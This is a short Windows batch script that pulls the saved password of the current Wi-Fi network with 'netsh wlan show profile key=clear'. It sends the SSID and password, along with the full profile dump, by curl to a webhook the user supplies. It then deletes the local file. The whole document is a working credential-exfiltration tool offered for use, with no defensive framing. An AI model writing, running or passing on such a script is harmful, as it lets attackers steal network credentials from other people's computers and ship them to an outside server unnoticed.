@echo off
setlocal enabledelayedexpansion

:: get current wifi ssid
for /f "tokens=2 delims=:" %%i in ('netsh wlan show interfaces ^| findstr /r /c:" SSID"') do (
    set SSID=%%i
    set SSID=!SSID:~1!
    for /l %%j in (0,1,31) do if "!SSID:~-1!"==" " set SSID=!SSID:~0,-1!
)

:: check if ssid was successfully obtained
if "%SSID%"=="" (
    echo encountered error while getting wifi ssid
    goto end
)

rem echo Current wifi ssid: %SSID%

:: output the netsh command
netsh wlan show profile name="%SSID%" key=clear > wifi_details.txt

:: print the contents of the file for debugging
rem type wifi_details.txt

:: get current wifi password
for /f "tokens=2 delims=:" %%i in ('findstr /r /c:"Key Content" wifi_details.txt') do (
    set PASSWORD=%%i
    set PASSWORD=!PASSWORD:~1!
    for /l %%j in (0,1,31) do if "!PASSWORD:~-1!"==" " set PASSWORD=!PASSWORD:~0,-1!
)

:: check if password was successfully obtained
if "%PASSWORD%"=="" (
    echo encountered error while getting wifi password
    goto end
)

rem echo current wifi password: %PASSWORD%

set WEBHOOK_URL=REPLACE THIS WITH YOUR OWN WEBHOOK
set MESSAGE=%SSID%:%PASSWORD%

:: send details of currently using wifi
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%MESSAGE%\"}" %WEBHOOK_URL%

:: send details of all record wifi
curl -H "Content-Type: multipart/form-data" -F "file=@wifi_details.txt" %WEBHOOK_URL%

:end
del wifi_details.txt
endlocal
